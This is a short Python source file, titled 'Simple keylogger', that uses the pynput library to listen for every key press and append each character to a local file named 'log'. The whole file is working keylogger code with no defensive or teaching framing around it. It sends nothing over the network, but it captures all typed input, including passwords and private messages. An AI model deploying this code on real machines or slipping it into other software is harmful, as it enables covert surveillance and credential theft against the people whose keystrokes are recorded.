"""
Simple keylogger
"""

from pynput.keyboard import Key, Listener

def on_press(key):
    """
    Saves keyboard input into the log file
    """
    try:
        with open("log", "a+") as f:
            if key == Key.enter:
                f.write("\n")
            else:
                f.write(key.char)
    except AttributeError:
        pass

with Listener(on_press=on_press) as listener:
    listener.join()
